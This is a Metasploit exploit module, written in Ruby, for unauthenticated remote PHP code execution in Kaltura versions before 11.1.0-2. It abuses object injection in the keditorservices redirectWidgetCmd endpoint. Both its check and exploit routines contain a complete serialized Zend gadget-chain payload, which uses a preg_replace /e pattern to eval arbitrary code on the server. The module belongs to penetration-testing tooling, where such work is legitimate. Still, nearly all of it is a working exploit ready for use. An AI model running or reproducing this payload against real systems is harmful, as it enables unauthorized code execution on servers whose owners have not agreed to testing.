##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Kaltura Remote PHP Code Execution',
      'Description'    => %q{
        This module exploits an Object Injection vulnerability in Kaltura.
        By exploiting this vulnerability, unauthenticated users can execute
        arbitrary code under the context of the web server user.

        Kaltura has a module named keditorservices that takes user input
        and then uses it as an unserialized function parameter. The constructed
        object is based on the SektionEins Zend code execution POP chain PoC,
        with a minor modification to ensure Kaltura processes it and the
        Zend_Log function's __destruct() method is called. Kaltura versions
        prior to 11.1.0-2 are affected by this issue.

        This module was tested against Kaltura 11.1.0 installed on CentOS 6.8.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Security-Assessment.com',             # discovery
          'Mehmet Ince <mehmet@mehmetince.net>'  # msf module
        ],
      'References'      =>
        [
          ['EDB', '39563']
        ],
      'Privileged'      => false,
      'Platform'        => ['php'],
      'Arch'            => ARCH_PHP,
      'Targets'         => [ ['Automatic', {}] ],
      'DisclosureDate'  => 'Mar 15 2016',
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI of the Kaltura installation', '/'])
      ]
    )
  end

  def check
    r = rand_text_alpha(15 + rand(4))
    cmd = "print_r(#{r}).die()"

    p = ""
    p << "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";"
    p << "a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\00*\00_eventsToMail\";"
    p << "a:1:{i:0;i:1;}s:22:\"\00*\00_layoutEventsToMail\";a:0:{}s:8:\"\00*\00_mail\";"
    p << "O:9:\"Zend_Mail\":0:{}s:10:\"\00*\00_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\00*\00_inflector\";"
    p << "O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\00*\00_matchPattern\";s:7:\"/(.*)/e\";"
    p << "s:15:\"\00*\00_replacement\";s:#{cmd.length.to_s}:\"#{cmd}\";}s:20:\"\00*\00_inflectorEnabled\";"
    p << "b:1;s:10:\"\00*\00_layout\";s:6:\"layout\";}s:22:\"\00*\00_subjectPrependText\";N;}}};}"

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php/keditorservices/redirectWidgetCmd'),
      'vars_get' => {
        'kdata' => Rex::Text.encode_base64(p)
      }
    )

    if res && res.body.include?(r)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    cmd = "print_r(eval(base64_decode('#{Rex::Text.encode_base64(payload.encode)}'))).die()"

    p = ""
    p << "a:1:{s:1:\"z\";O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";"
    p << "a:1:{i:0;O:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"\00*\00_eventsToMail\";"
    p << "a:1:{i:0;i:1;}s:22:\"\00*\00_layoutEventsToMail\";a:0:{}s:8:\"\00*\00_mail\";"
    p << "O:9:\"Zend_Mail\":0:{}s:10:\"\00*\00_layout\";O:11:\"Zend_Layout\":3:{s:13:\"\00*\00_inflector\";"
    p << "O:23:\"Zend_Filter_PregReplace\":2:{s:16:\"\00*\00_matchPattern\";s:7:\"/(.*)/e\";"
    p << "s:15:\"\00*\00_replacement\";s:#{cmd.length.to_s}:\"#{cmd}\";}s:20:\"\00*\00_inflectorEnabled\";"
    p << "b:1;s:10:\"\00*\00_layout\";s:6:\"layout\";}s:22:\"\00*\00_subjectPrependText\";N;}}};}"

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php/keditorservices/redirectWidgetCmd'),
      'vars_get' => {
        'kdata' => Rex::Text.encode_base64(p)
      }
    )
  end
end